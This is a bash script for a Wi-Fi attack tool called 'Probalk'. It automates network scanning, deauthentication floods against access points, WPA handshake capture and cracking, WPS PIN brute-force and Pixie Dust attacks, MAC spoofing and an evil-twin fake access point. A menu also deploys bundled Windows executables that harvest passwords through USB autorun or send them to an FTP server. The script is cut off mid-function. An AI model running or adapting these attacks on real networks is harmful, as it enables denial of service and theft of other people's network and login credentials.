#!/bin/bash
####
#check root
if [[ ! $(whoami) = "root" ]]; then
echo "Please run script as root"
exit 1
fi
if [ -e /tmp/probalk ]; then
rm -rf  /tmp/probalk
fi
chmod 7777 include
sleep 2
mkdir /tmp/probalk/

cp include/win36l.zip  /tmp/probalk
cp include/win36h.zip  /tmp/probalk
cp include/airmon.sh /tmp/probalk
chmod 7777 *
cd /tmp/probalk
chmod 7777 *
handshake=no
hiddens=no

##define colors
# Bold-text+colors
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Regular Colors

Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White
#               animation
blink=`echo -e "\033[5;31;40m(NEW) \033[0m\033[31;40m (can take long time \033[0m"`

center1 (){
termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  .{1..500})"
  printf $BGreen'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}
center2() {
  termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  -{1..500})"
  printf $BRed'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

center3() {
  termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  " ██"{1..500})"
  printf $BRed'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}


choise() {
termwidth="$(tput cols)"
  padding="$(printf '%0.1s'  "#"{1..500})"
  printf $BGreen'%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

sleep 2
#                setup-envirenment
#          	 mading temdir

ls 2&> /dev/null
cd /tmp/probalk 2&> /dev/null

#			cleanup
cleanup(){
cd /tmp/ 2&> /dev/null
cd /probalk/  2&> /dev/null
rm -rf *  2&> /dev/null
rmdir /tmp/probalk/ 2&> /dev/null
echo -e "$BPurple -Disabling Monitor Mode...."
ifconfig $nameintc down 2>/dev/null
iwconfig $nameintc mode managed  2>/dev/null
ifconfig $nameintc up 2>/dev/null
rfkill unblock all 2>/dev/null
iw $nameintc del 2&> /dev/null
echo -e "$BPurple -Starting Network Manager...."
service network-manager start 2&> /dev/null
killall xterm 2&> /dev/null
}
#########################################################################################################
clear && sleep 0.2
echo -e "$BGreen[*]checking For Needed Packages.... " && sleep 0.1 
echo -ne "$BGreen [+] aircrack-ng....."
if ! hash aircrack-ng 2>/dev/null; then
        echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi
sleep 0.025

echo -ne "$BGreen [+] aireplay-ng....."
if ! hash aireplay-ng 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "OK"
fi
sleep 0.025

echo -ne "$BGreen [+] airmon-ng......."
if ! hash airmon-ng 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	c
else
      echo -e "$BGreen OK"
fi
sleep 0.025

echo -ne "$BGreen [+] airodump-ng....."
if ! hash airodump-ng 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi

echo -ne "$BGreen [+] cowpatty....."
if ! hash cowpatty 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi

echo -ne "$BGreen [+] Macchanger....."
if ! hash macchanger 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi
sleep 0.025

echo -ne "$BGreen [+]awk............."
if ! hash awk 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi

echo -ne "$BGreen [+]UnZip............."
if ! hash unzip 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi

echo -ne "$BGreen [+]PixieWPs.........."
if ! hash pixiewps 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi
echo -ne "$BGreen [+]Reaver............."
if ! hash reaver 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi


echo -ne "[+]Bully............."
if ! hash bully 2>/dev/null; then
	echo -e "$BRed Package Not Installed"
	exit=1
else
	echo -e "$BGreen OK"
fi

###################
scanheart(){
cd /tmp/probalk
xterm  -geometry "150x100+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Scanning For Networks ... " -e "airodump-ng  -w tempsoyalk  --output-format csv --encrypt WPA --wps --uptime  --manufacturer    --ignore-negative-one $nameintc"
}
########
printscan(){
cd /tmp/probalk

filecsv=tempsoyalk-01.csv


nmb=`sed -n '/BSSID/,/Station MAC/p' $filecsv | wc -l`
declare nmbreal
nmbreal=$((nmb-1))
echo -e "    $Blue      BSSID           # CHANNEL     POWER(%)  ENCREPTION      ESSID "
for i in $(seq 3  $nmbreal)
do
        p=$((i-2))
        if (($p<10)) ;then
        p=" $p"
        fi 
        PWR=`awk -F, 'NR == '$i' {print $9 }' $filecsv `
	PWR=`expr $PWR + 100` 
	if (($PWR<30)) ;then
        COLORE=$BRed
        fi 
	if (($PWR>30)) ;then
        COLORE=$BGreen
        fi 
	lk=`echo -e $COLORE`
	printf " $lk $p) `awk -F, 'NR == '$i' {print " " $1 "  #" $4"          " '$PWR' "       "  $6  "       "    $14 }' $filecsv` \n"
done
tt=$(($(($nmbreal))-2))

y3=0
while [ $y3 = 0 ] ; do
	read -p "Choose The Network You Want To Use:" option3
	case $option in 
	[1-400])

	   y3=1
	   	if [ -z $option3 ]; then
		      echo "invalide"
		      y3=0

	   	elif (( option3 > tt  )); then
		      echo "invalide"
		      y3=0
		else
                	   echo "valide"
			
	        fi

	;;
	*)
	  echo "invalide"
	   y3=0
	;;
	esac



done
option3=$option3+1
bssid=`awk -F, 'NR == '$option3+1' {print $1 }' $filecsv `
essid=`awk -F, 'NR == '$option3+1' {print $14 }' $filecsv `
ch=`awk -F, 'NR == '$option3+1' {print $4 }' $filecsv `
printselected
sleep 1.5
mainpage


}
###########

printselected(){

if [ "$bssid" ]; then
		
	choise "{Network Selected}"
	echo -e "$Green ESSID => $BGreen:  $essid"
	echo -e "$Cyan BSSID => $BGreen:  $bssid"
	echo  -e "$Blue CHANNEL => $BGreen: $ch"
	#choise ""
else
	choise "{Network Selected}"
	echo "Target Network : Not selected Yet"
fi

if [ "$nameintc" ]; then
		
	choise "{Interface Selected}"
	echo -e "$Green Interface  => $BGreen: $nameintc"

else
	choise "{Interface Selected}"
	echo "Interface : Not selected Yet"
		
fi
if [ "$handshake" == "yes" ] ; then
		choise "{Handshake}"		
	echo -e $Green "status : captured "handshake-01.cap" "
	
	choise ""
else
	choise "{Handshake}"		
	echo "status : Not Captured Yet"
	choise ""
		
fi


}
pausef(){
read -p "$*"
}


##################function####enable-monitor-mode
enablemonitormode(){
clear
nameint=`echo -e "$Green Choose  $BPurple The interface  $Green You want $BRed To $Green Use : "`
defstartsoyalk
choise "{Interfaces}"
echo -e "  $BRed Interface           $Green Chipset 	  $Yellow	Driver"
intn=`./airmon.sh   | grep -c "-"`
readarray -t wirelessifaces < <(./airmon.sh    |grep "-" | cut -d- -f1)
if [ "$intn" -gt "0" ]; then

                if [ "$intn" -eq "1" ]; then

		        line1=$wirelessifaces		
			echo -e "$Yellow 1) $line1" 
			choise "Auto Selected"
			echo  "ONE Interface Detect .Will Be Auto Selected"
			intface=`echo ${wirelessifaces[0]} | awk '{print $1 }'`
			monface=`echo $intface`
                else
                        i=0

                        for line in "${wirelessifaces[@]}"; do
                                i=$(($i+1))
                                wirelessifaces[$i]=$line
                                echo -e " "$i") $line"
                        done
			choise "{Interfaces}"
			read -p "$nameint" intni
			intni=$(($intni+0))
			intface=`echo ${wirelessifaces[$intni]} | awk '{print $1}' `
			monface=`echo $intface`
		fi

		

fi
sleep 0.1
nameintc="$monface"
airmon-ng check kill #2&> /dev/null
rfkill unblock all 2>/dev/null
ifconfig $nameintc down 2>/dev/null
iwconfig $nameintc mode monitor  2&> /dev/null
ifconfig $nameintc up 2>/dev/null

choise "#"
mainpage
}
txpower(){
txp1=`iwconfig wlan0 | grep Tx-Power| cut -d = -f 2`

txpv1=`echo "The Tx-power Of $nameintc is :$txp1 "`
echo -e  "$Cyan $txpv1"
read -p "Enter The Tx-power You Want To Set (examples: 30dbm /20dbm ..) : " Power
ifconfig $nameintc down
iw reg set BO
iwconfig $nameintc txpower $Power
ifconfig $nameintc up
txp2=`iwconfig wlan0 | grep Tx-Power| cut -d = -f 2`
txpv2=`echo "Your Tx-Power Is : $txp2"`
echo -e  "$Cyan $txpv2"
if [ "$txp2" == "$txp1" ]; then
   echo -e "-$BRed Somthing Went Wrong Tx-Power Not changed  "
   echo -e "($Red you may runing linux in a virtual machine or your wifi adapter does'nt support this operation....  "
else
   echo -e "$BGreen -changed sucessefully"
fi
sleep 3
mainpage

}
selectarget(){
echo -e "A New Window Will Apeare .When You see Your Network Tap Once CTRL+C" && sleep 0.5
pausef 'Are You Ready ? [Press Enter To Start Scanning  ]... ' 

scanheart
clear
defstartsoyalk
printscan

}

exel(){
unzip  /tmp/probalk/win36l.zip -d   ~/Desktop
sleep 3
mainpage

}
exeh(){

unzip  /tmp/probalk/win36h.zip  -d ~/Desktop
sleep 3
mainpage
}


usbbadmain(){
	defstartsoyalk
	echo -e "$Green Chose Mode Of Attack  (visit our website to see more infos ...)"
	choise "{Probalk}"
	echo -e "$Cyan 1) USB [ EXE + AUTORUN ]  Passwords will be saved in The same usb {User Privileges}"
	choise "{Probalk}"
	echo -e "$Cyan 2) EXE Migratable With any other programme .Passwords Will be sent To Your FTP Server {Admin Privileges}"
	choise "{Probalk}"
	echo -e "$Cyan 1st Attack Will Generate Folder At The Desktop Of This System Then Copy It Content  To The usb The Usb Must Be Formated with NFTS Files Systemes  "
	echo -e " 2nd Attack Will Generate Folder with exe Hidden Programme You Need To Open It With Winrar . And open  "tmpftp.win" With Your Text editor Decode(base64) It content Then Replace It With Yours Encrypt it Again and save Modifications.now It is ready To USE "
	choise "{Probalk}"
u=0

while [ $u = 0 ]   
do
read -p " Enter The Number Of Your Choise:" choiseheart
      case "$choiseheart" in
	1)
	exel
	u=1
	;;
	2)
	exeh
	u=1
	;;
	*)
	u=0	
	echo "Invalide choise .."
	;;
      esac
done


}
crack_pin(){
if [ "$hiddens" == "no" ] ; then
hdn=""
else
hdn="-e $essid"
fi
pin=`cat /tmp/probalk/pixiewpsreaver.txt  | grep "WPS pin:"|cut -d : -f2`  
pin=`echo $pin`
if [ "$pin" != "" ] ; then
	echo "Passwords & pin cracked by probalk" > ~/Desktop/probalk_passwords.txt
	echo "{+}essid=$essid" >> ~/Desktop/probalk_passwords.txt
	echo "{+}bssid=$bssid" >> ~/Desktop/probalk_passwords.txt
	echo "{+}Pin=$pin" >> ~/Desktop/probalk_passwords.txt
	echo -e "$Red Pin $Green Found $Cyan:$pin"
	echo "[+] Running reaver with the current pin ..."
	reaver -i $nameintc "$hdn" -b $bssid  -c $ch  -p $pin  2>&1 | tee /tmp/probalk/pixiewps.txt
	cat /tmp/probalk/pixiewps.txt | grep "WPA PSK:" >> ~/Desktop/probalk_passwords.txt
	echo -e "$BGreen"
	pausef 'press any key to continue ....'

else
	echo "failed"
	sleep 2
fi


}

pixiewpsrever(){
	trap wpsmainpage SIGINT SIGTERM SIGHUP
if [ "$hiddens" == "no" ] ; then	

		iwconfig $nameintc channel $ch
	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc  -b $bssid  -c $ch     -K 1 -q -N -vvv -f  2>&1 | tee /tmp/probalk/pixiewpsreaver.txt && killall xterm "
else
xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc -b $bssid   -c $ch -e $essid    -K 1 -q -N -vvv -f  2>&1 | tee /tmp/probalk/probalk_passwords.txt "
fi
crack_pin

}
pixiewpsbully(){
	iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
if [ "$hiddens" == "no" ] ; then	

	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully   -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt"
else
	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully  -e $essid -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt "


fi
}
defaultpinreaver(){
		iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
	read -p "For Belkin Routers Type 1 For D-Link Routers Type 2 :" W
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Default Pins Generated By Reaver"  -e "reaver -i  $nameintc -b $bssid -e $essid -c $ch   -W $W -q -f"
	

}

brueteforcepinreaver(){
	iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using Reaver "  -e "reaver -i  $nameintc -b $bssid -e $essid -c $ch   -f "



}
bruteforcepinbully(){
	iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
if [ "$hiddens" == "no" ] ; then		
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -b $bssid  -c $ch -B -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"

else
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using bully "  -e "bully   -e $essid  -c $ch -B -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"


fi
}

cutompinreaver(){
	iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
	read -p "Enter The Pin You Want To Crack :" $pin
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "reaver -i  $nameintc -b $bssid -e $essid -c $ch  -p $pin "



}
cutompinbully(){
	iwconfig $nameintc channel $ch
	trap wpsmainpage SIGINT SIGTERM SIGHUP
	read -p "Enter The Pin You Want To Crack :" $pin
if [ "$hiddens" == "no" ] ; then		
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully   -b $bssid -e $essid -c $ch -p $pin -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"
else
	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Crack Custom Pin With Reaver "  -e "bully    -e $essid -c $ch -p $pin -F $nameintc -o  ~/Desktop/bully.pin.probalk.txt"


fi
}
checkhidden(){


	iwconfig $nameintc channel $ch
	xterm -hold -geometry "60x60+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Sending Deathifications Frames To The Boardcast" -e "aireplay-ng --deauth  999999999 -a $bssid $nameintc" & pid1=$!
	PID_1=" $pid1";


	xterm -hold -geometry "150x120+900+0" -bg "#1d2951" -fg "#d1e231"  -title "Scanning For Networks ..." -e "airodump-ng  -w tempsoyalkhiden  --output-format csv --bssid $bssid -c $ch --showack --wps --uptime --manufacturer   $nameintc " & pid2=$!
	PID_2=" $pid2";
	checkk  & pid3=$! 2>/dev/null
	PID_3=" $pid3";
trap "kill $PID_2 kill $PID_1  kill $PID_3" SIGINT 2>/dev/null
wait $PID_1 $PID_2 $PID_3
 echo

essid=`awk -F"," ' NR==3 { print $14 } ' tempsoyalkhiden-01.csv`
}
checkk(){
f=0

sleep 2 && filecsvhid=tempsoyalkhiden-01.csv

while  [ $f = 0 ] ; do
sleep 2
if [ -e "$filecsvhid" ] ; then
essid=`awk -F"," ' NR==3 { print $14 } ' tempsoyalkhiden-01.csv`
essid=`echo -e $essid`
essid="$essid"
fi
f=0

if [ "$essid" != "" ] ; then
	f=1
	killall xterm
	echo "essid is $essid"
	sleep 2
	hiddens=yes
fi


done

}


heartwithout(){
	trap mainpage SIGINT SIGTERM SIGHUP	
	if [ "$handshake" == "yes" ] ; then
		read -p "handshake already captured would you like to use it (y/n) :" handopt
		if [ "$handopt" == "y" ] ; then 
			handshakep=handshake-01.cap
		else

		read -p "Enter The handshake path:" handshakep
		fi
	else 
				read -p "Enter The handshake path:" handshakep
	fi
		
	pwdpath=~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt

	iwconfig $nameintc channel $ch
	xterm -hold -geometry "100x60+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes  " -e "airodump-ng -w tmp  --output-format netxml $nameintc -c $ch" & pid5=$!
	PID_1=" $pid1";
	loopheart & pid6=$!  2>/dev/null
	PID_6=" $pid6";
	loopai & pid7=$!
	PID_7=" $pid7";
	result & pid13=$!
	PID_13=" $pid13";

	wait $PID_7 $PID_6 $PID_5 $PID_13
 	echo
	result
	sleep 5
	mainpage



}


loopai(){
r=0
while  [ $r = 0 ] ; do
	xterm -hold -geometry "70x30+300+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes Aircrack-ng " -e "aircrack-ng  -a2 -b $bssid -w tmp.txt $handshakep -l ~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt" & pid9=$!
	PID_9=" $pid9";
	sleepandkil  & pid10=$!
	PID_10=" $pid10";	
	wait $PID_9 $PID_10 
	
	sleep 2
done
}

sleepandkil(){
	sleep 4
	kill $pid9 2>/dev/null

}
heartwithmdk(){


trap mainpage SIGINT SIGTERM SIGHUP	
	if [ "$handshake" == "yes" ] ; then
		read -p "handshake already captured would you like to use it (y/n) :" handopt
		if [ "$handopt" == "y" ] ; then 
			handshakep=handshake-01.cap
		else

		read -p "Enter the handshake path :" handshakep
		fi
	else
			read -p "Enter The handshake path:" handshakep
	fi
		
	pwdpath=~/Desktop/PASSWORD-OF-WIFI-CRACKED.txt

	iwconfig $nameintc channel $ch
	echo $bssid>blacklist.txt
	xterm -hold -geometry "30x30+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes Deauth With MDK3  " -e "mdk3  $nameintc d -b blacklist.txt -c $ch" & pid321=$!
	PID_321=" $pid321";
	xterm -hold -geometry "100x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "Heart-Bleed-Probes Aircrack-ng " -e "airodump-ng -w tmp  --output-format netxml $nameintc -c $ch" & pid5=$!
	PID_1=" $pid1";
	loopheart & pid6=$! 2>/dev/null
	PID_6=" $pid6";
	loopai & pid7=$!
	PID_7=" $pid7";
	result & pid13=$!
	PID_13=" $pid13";
	trap mainpage SIGINT 2>/dev/null
	wait $PID_7 $PID_6 $PID_5 $PID_13 $PID_321
 	echo
	result
	sleep 5
	mainpage

}
loopheart(){
	
t=0
while  [ $t = 0 ] ; do
	sleep 1
	grep -o '<ssid>.*</ssid>' tmp-01.kismet.netxml | sed 's/\(<ssid>\|<\/ssid>\)//g' > tmp.txt 
	if [ -e "$pwdpath" ] ; then
		t=1	
	fi

done
}
result(){

res=0
while  [ $res = 0 ] ; do
if [ -e "$pwdpath" ] ; then
	killall xterm 2>/dev/null
	kill $PID_10 2>/dev/null ;kill $PID_9 2>/dev/null; kill $PID_7 2>/dev/null; kill $PID_6 2>/dev/null ; kill $PID_5 2>/dev/null

	kill $PID_6  2>/dev/null  ; kill $PID_5  2>/dev/null ; kill $PID_7 2>/dev/null ;
	pwdh=`cat $pwdpath`
	pwdh=`echo $pwdh`	
	echo -e " $BCyan  PASSWORD $BGreen FOUND => $Yellow "$pwdh""
	res=1
	sleep 9
		pausef 'press any key to continue ....'
fi
done
}

#####################################handcapture
virefyhand(){
me=0
while  [ $me = 0 ] ; do
	me=0	
	verify=`cowpatty -c -r handshake-01.cap |grep crack|awk '{print $7}'`  
	if [ "$verify" == "crack" ] ; then
	kill $PID_30 
	kill $PID_176
	killall xterm
	
	me=1
		
	fi
done
}

handcapture(){
defstartsoyalk
trap mainpage SIGINT 2>/dev/null
		iwconfig $nameintc channel $ch
	xterm -hold -geometry "110x60+4000+0" -bg "#1d2951" -fg "#d1e231"  -title "capturing handshake " -e "airodump-ng -w handshake  --output-format cap $nameintc --bssid $bssid -c $ch" & pid30=$!
	PID_30=" $pid30";
	virefyhand 2&> /dev/null & pid31=$!
	PID_31=" $pid31";
	xterm -hold -geometry "60x30+0+0" -bg "#1d2951" -fg "#d1e231"  -title "Sending Deathifications Frames To The Boardcast" -e "aireplay-ng --deauth  999999999 -a $bssid $nameintc" & pid176=$!
	PID_176=" $pid176";
	wait $PID_30 $PID_31 $PID_176
	handshake=yes
}

randmac(){

ifconfig $nameintc down 2>/dev/null
choise "{Probalk}"
macchanger -r  $nameintc  
choise "{Probalk}"
ifconfig $nameintc up 2>/dev/null
choise "{Probalk}"
sleep 2
wpsmainpage
}

macclient(){


	iwconfig $nameintc channel $ch
	


	xterm -hold -geometry "150x120+900+0" -bg "#1d2951" -fg "#d1e231"  -title "Scanning For clients ..." -e "airodump-ng  -w tmpmac  --output-format csv --bssid $bssid -c $ch  --wps --uptime --manufacturer   $nameintc " & pid4=$!
	PID_4=" $pid4";
	checkclient & pid5=$! #2>/dev/null S
	PID_5=" $pid5";
trap "kill $PID_4 kill $PID_5" SIGINT 2>/dev/null
wait  $PID_5 $PID_4
 echo
mac=`sed -n '/Station MAC/,//p' tmpmac-01.csv | grep "$bssid" | awk -F',' 'NR == 1 { print $1} ' `
ifconfig $nameintc down
macchanger -m $mac $nameintc
ifconfig $nameintc up
choise "{Probalk}"
sleep 2.5

}


checkclient(){
m=0
filecsvmac=tmpmac-01.csv
sleep 0.1

while  [ $m = 0 ] ; do
m=0
if [ -e "$filecsvmac" ] ; then
mac=`sed -n '/Station MAC/,//p' tmpmac-01.csv | grep "$bssid" | awk -F',' 'NR == 1 { print $1} ' `

fi

if [ "$mac" != "" ] ; then
	m=1
	killall xterm
choise "{Probalk}"
	echo " MAC of a client   is $mac"
	echo " I Will Change Your Mac To It..."
choise "{Probalk}"

	sleep 2
fi
done
}
macspoof(){
defstartsoyalk
choise "{Probalk}"
echo -e "$Cyan Wich Kind Of $Red Mac Filtering $Green Your Router Use $Cyan .(Only autorised Devices Can Connect Or Blocked Mac Adress )"
choise "{Probalk}"
echo -e "$Cyan 1)Change The MAC Adress To Random MAC (Against Black-list Mode) "
choise "{Probalk}"
echo -e "$Cyan 2)Change The MAC Adress To A Client  MAC (Against  white-list Of Routers) "
choise "{Probalk}"
read -p " Enter The Number Of Your Choise :" macoption
if [ "$macoption" == "1" ] ; then 
	randmac
elif [ "$macoption" == "2" ] ; then 
	macclient
else 
	echo -e "Wrong Choise"
fi

}
sleepandkil2(){
	sleep 30
	kill $pid9 2>/dev/null

}
loopaiwep(){
w=0
while  [ $w = 0 ] ; do
	xterm -hold -geometry "70x30+300+0" -bg "#000000" -fg "#20C20E"   -title " Aircrack-ng " -e "aircrack-ng -b $mssid  wephand-01.cap -l ~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt" & pid9=$!
	PID_9=" $pid9";
	sleepandkil2  & pid10=$!
	PID_10=" $pid10";	
	wait $PID_9 $PID_10 
	
	sleep 5
done
}
evil_twin_wep (){
iwconfig $nameintc channel $ch
defstartsoyalk
choise "{select second interface}"
echo -e "$Green NEXT VERSION WE WILL TRY TO REDUCE THE SUFFICIENT TIME BY INCRYSING DATA TRANSMITION... WE THINK ALSO TO MADE CAPTIVE PORTAL INSTEAD OR CONNECT IT WITH INTERNET TO LET THE CLIENT STAY MORE TIME IN OUR NETWORK SO WE CAN BRUTEFORCE IVS AN SEE TRYED PASSWORD.WILL ALSO TRY TO MAKE THE ACCES POINT ACCESIBLE JUST FOR THE CLIENTS THAT ARE CONNECTED BEFORE WITH THE ORIGINAL ACCES POINT SO THAT WE INCREASE THE POSIBILITY OF GET THE CORRECT PASSWORD"
nameint=`echo -e "$Green Choose  $BPurple The Second interface  $Green You want $BRed To $Green Use : "`
defstartsoyalk
echo $nameint
choise "{Interfaces}"
echo -e "  $BRed Interface           $Green Chipset 	  $Yellow	Driver"
intn=`./airmon.sh   | grep -c "-"`
readarray -t wirelessifaces < <(./airmon.sh    |grep "-" | cut -d- -f1)
if [ "$intn" -gt "0" ]; then

                if [ "$intn" -eq "1" ]; then

		        line1=$wirelessifaces		
			echo -e "$Yellow 1) $line1" 
			choise "Auto Selected"
			echo  "ONE Interface Detect .Will Be Auto Selected"
			intface=`echo ${wirelessifaces[0]} | awk '{print $1 }'`
			monface=`echo $intface`
                else
                        i=0

                        for line in "${wirelessifaces[@]}"; do
                                i=$(($i+1))
                                wirelessifaces[$i]=$line
                                echo -e " "$i") $line"
                        done
			choise "{Interfaces}"
			read -p "$nameint" intni
			intni=$(($intni+0))
			intface=`echo ${wirelessifaces[$intni]} | awk '{print $1}' `
			monface=`echo $intface`
		fi

		

fi
sleep 0.1
nameintc2="$monface"
airmon-ng check kill #2&> /dev/null
rfkill unblock all 2>/dev/null
ifconfig $nameintc2 down 2>/dev/null
iwconfig $nameintc2 mode monitor  2&> /dev/null
ifconfig $nameintc2 up 2>/dev/null
choise "#"
echo -e $GReen" IF YOU USE THE SAME INTERFACE IT MAY STOP DURING THE ATTACK .IT WILL ALSO SLOW DOWN THE ATTACK "
choise "#"
echo -e $BGreen" First Interface :$nameintc       $Yellow:will be used for fakeAP and capture IVS "
choise "#"
echo -e $BGreen" Second Interface :$nameintc2     $Yellow:will be used for deauth the original AP and send ARP-request replay "
choise "#"
pausef 'Press Any key To Start The attack...'
iwconfig $nameintc2 channel $ch
iwconfig $nameintc channel $ch
APmac=`echo $bssid |cut -d: -f 1,2,3,4,5 `  2>/dev/null
mssid=`echo "$APmac:AA"` 2>/dev/null
mssid=`echo $mssid` 2>/dev/null
echo $bssid>blacklist2
pwdpath="~/Desktop/PASSWORD-OF-WIFI-CRACKED-evilTWIN.txt"

xterm -hold -geometry "116x24+900+0" -bg "#000000" -fg "#20C20E"  -title "airodump-ng (capturing IVS)" -e " airodump-ng -c $ch -d $mssid  -w wephand --output-format cap $nameintc  --uptime --manufacturer  " & pid76=$!
	PID_76=" $pid76";
xterm -hold -geometry "116x24+900+900" -bg "#000000" -fg "#20C20E"  -title "FAKE AP" -e " airbase-ng -c $ch -a $mssid --essid $essid -L -W 1 $nameintc" & pid97=$!
	PID_97=" $pid97";
xterm -hold -geometry "116x24+0+0" -bg "#000000" -fg "#20C20E"  -title "caffe-latte Attack" -e "  aireplay-ng  --caffe-latte  -b  $mssid  $nameintc2" & pid24=$!
	PID_24=" $pid24";
xterm -hold -geometry "116x24+0+900" -bg "#000000" -fg "#20C20E"  -title "Deauth The Original AP MDK3 " -e " mdk3 $nameintc d -b blacklist2 -c $ch" & pid27=$!
	PID_27=" $pid27";
loopaiwep & pid56=$! 
	PID_56=" $pid56";
result & pid51=$!
	PID_51=" $pid51";
trap "kill $PID_76 kill $PID_97  kill $PID_27  kill $PID_24 kill $PID_56 kill $PID_51" SIGINT 2>/dev/null
wait  $PID_97 $PID_76 $PID_27 $PID_24 $PID_56 $PID_51 2>/dev/null

}
#####exit

trap control_c SIGINT SIGTERM SIGHUP
function control_c {
defstartsoyalk
choise "{Probalk}"
cleanup
echo -e "$BPurple -Cleaning Up All Temporary Files Created By This Script....Hope All Processes Are Killed"
echo -e "$BCyan -This Script Was Created By SOYALK From morocco.To Demonstrate How Can Hackers Do To Get In Your Network Hope You Enjoy It."
echo -e "$BYelow -You can Suggest Some Features To Be Added Next Version EMAIL: likramabderrahman@gmail.com"
echo -e "$BCyan Support US By Donate $GGreen :[+] https://www.paypal.me/Likram [+]  $BCyan Small Donate Help Us To improve Our Prpjects  "
echo -e "$BYelow website : [*] https://www.soyalk.tk [*] "
center3 " SEE YOU (;"
choise "{Probalk}"



exit $?
}
####
sleep 1
##Start-logo
defstartsoyalk(){
clear
center1 "  ██████╗ ██████╗  ██████╗ ██████╗  █████╗ ██╗     ██╗  ██╗" && sleep 0.1
center1 "  ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║     ██║ ██╔╝" && sleep 0.1
center1 "  ██████╔╝██████╔╝██║   ██║██████╔╝███████║██║     █████╔╝ " && sleep 0.1
center1 "  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ " && sleep 0.1
center1 "  ██║     ██║  ██║╚██████╔╝██████╔╝██║  ██║███████╗██║  ██╗" && sleep 0.1
center1 "  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝" && sleep 0.1
YEAR=`date -u +%Y`
center2 " Script By Soyalk For Testing Networks Security.® $YEAR "
sleep 0.5
}
choises(){
choise "{Probalk}"
sleep 0.1 
